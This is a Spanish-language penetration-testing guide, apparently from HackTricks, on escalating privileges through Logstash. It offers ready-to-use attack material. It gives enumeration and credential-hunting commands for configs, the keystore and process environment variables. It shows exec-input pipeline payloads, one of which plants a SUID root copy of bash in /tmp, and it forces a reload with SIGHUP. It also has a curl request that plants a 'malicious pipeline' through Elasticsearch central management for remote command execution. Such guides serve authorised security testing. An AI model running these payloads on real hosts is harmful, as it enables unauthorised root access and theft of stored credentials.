# Escalada de privilegios de Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y distribuir logs** mediante un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**.<sup>[[4]](#references)</sup> Un aspecto interesante surge cuando Logstash opera en una máquina comprometida.

### Configuración de Pipeline

En las instalaciones de paquetes Debian y RPM, los pipelines se configuran mediante **/etc/logstash/pipelines.yml**, que enumera las ubicaciones de las configuraciones de los pipelines; otras distribuciones ubican `pipelines.yml` en el directorio `path.settings` de Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf** que contienen las configuraciones de pipeline. Al utilizar un **Elasticsearch output**, revisa sus configuraciones `user`/`password`, `cloud_auth` o `api_key`; los privilegios efectivos de la cuenta dependen de Elasticsearch. Un glob `path.config` carga todos los archivos coincidentes para ese pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, `-f` tiene precedencia y **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**.<sup>[[6]](#references)[[7]](#references)</sup> Esto crea 2 implicaciones ofensivas:

- Un archivo colocado como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla el pipeline final
- Un archivo mal formado puede hacer que la configuración combinada falle la validación; durante la recarga, Logstash conserva el pipeline anterior, por lo que debes validar los payloads antes de confiar en el auto-reload.<sup>[[1]](#references)</sup>

### Enumeración rápida en un host comprometido

En un equipo donde Logstash está instalado, inspecciona rápidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Comprueba también si la API de monitorización local es accesible. De forma predeterminada, escucha en **127.0.0.1:9600**, lo que normalmente es suficiente después de obtener acceso al host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Estos endpoints exponen los ID y la configuración de los pipelines, las métricas de runtime y los contadores de éxito o fallo de la recarga de la configuración, lo que ayuda a confirmar si se aceptó un cambio.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Si una credencial recuperada apunta a **Elasticsearch**, consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation mediante Writable Pipelines

Para intentar una escalada de privilegios, identifica primero el usuario con el que realmente se está ejecutando el servicio de Logstash; no asumas que es root o el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Tener **acceso de escritura** a un archivo **.conf** de un pipeline **o**
- Que el archivo **/etc/logstash/pipelines.yml** utilice un wildcard y puedas escribir en la carpeta objetivo.<sup>[[6]](#references)[[7]](#references)</sup>

Además, debe cumplirse **una** de estas condiciones:

- Poder reiniciar el servicio de Logstash **o**
- Que el archivo **/etc/logstash/logstash.yml** tenga configurado `config.reload.automatic: true`.<sup>[[1]](#references)[[15]](#references)</sup>

Si hay un wildcard en la configuración, crear un archivo que coincida con este wildcard permite ejecutar comandos.<sup>[[7]](#references)[[9]](#references)</sup> Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo proporcionado, el comando **whoami** se ejecuta cada 120 segundos y su salida se dirige a **/tmp/output.log**.<sup>[[9]](#references)</sup>

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse.<sup>[[1]](#references)[[15]](#references)</sup> Si no hay ningún comodín, aún se pueden realizar modificaciones en las configuraciones existentes, pero se recomienda tener precaución para evitar interrupciones.

### Payloads de Pipeline más fiables

El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere un `interval` o un `schedule`. Se ejecuta haciendo **fork** de la JVM de Logstash, por lo que, si la memoria es escasa, tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.<sup>[[9]](#references)</sup>

Cuando el servicio tiene privilegios suficientes para crear un archivo SUID propiedad de root, un payload práctico de escalada de privilegios es uno que deje un artefacto persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar, pero puedes enviar señales al proceso, Logstash también admite una recarga activada por **SIGHUP** en sistemas similares a Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins son compatibles con la recarga. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no asumas que `config.reload.automatic` siempre detectará tus cambios.<sup>[[1]](#references)</sup>

### Robar secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales pueden aparecer en las salidas `elasticsearch {}`, las URL o configuraciones de `http_poller`, las entradas JDBC o las configuraciones relacionadas con cloud; estos plugins exponen campos de credenciales que merece la pena buscar.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- La configuración segura puede encontrarse en **`/etc/logstash/logstash.keystore`** u otro directorio `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- La contraseña del keystore puede proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones RPM/DEB cargan las variables de entorno del servicio desde **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- La expansión de variables de entorno mediante `${VAR}` se resuelve al iniciar Logstash, por lo que merece la pena inspeccionar el entorno del servicio.<sup>[[14]](#references)</sup>

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
También merece la pena comprobar esto porque **CVE-2023-46672** demostró que, en circunstancias específicas, Logstash registraba información sensible en sus logs, incluidos secretos almacenados en su keystore y referenciados desde la configuración; revisa los logs antiguos de Logstash y las entradas de `journald` si esas circunstancias pueden aplicarse.<sup>[[3]](#references)</sup>

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si se configura **`xpack.management.enabled: true`**, Logstash puede obtener pipelines gestionados centralmente desde Elasticsearch/Kibana, y después de activar este modo, las configuraciones de pipeline locales dejan de ser la fuente de verdad.<sup>[[2]](#references)</sup>

Esto implica una ruta de ataque diferente:

1. Recupera las credenciales de Elastic de la configuración local de Logstash, el keystore o los logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Comprueba si la cuenta tiene el privilegio de cluster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Crea o reemplaza un pipeline gestionado centralmente para que el host de Logstash ejecute tu payload durante su próximo intervalo de consulta.<sup>[[2]](#references)[[16]](#references)</sup>

La API de Elasticsearch utilizada para esta función es:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Esto resulta especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Recarga del archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configuración de la gestión centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Actualización de seguridad de Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Creación de un pipeline de Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Estructura de directorios de Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Múltiples pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Ejecución de Logstash desde la línea de comandos](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitorización de Logstash con APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: plugin de entrada Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: almacén de claves de Secrets para configuraciones seguras](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: plugin de salida de Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: plugin de entrada Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: plugin de entrada Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Uso de variables de entorno](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API de Elasticsearch: Creación o actualización de un pipeline de Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API de Logstash: Obtención de la configuración de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API de Logstash: Obtención de estadísticas de los pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
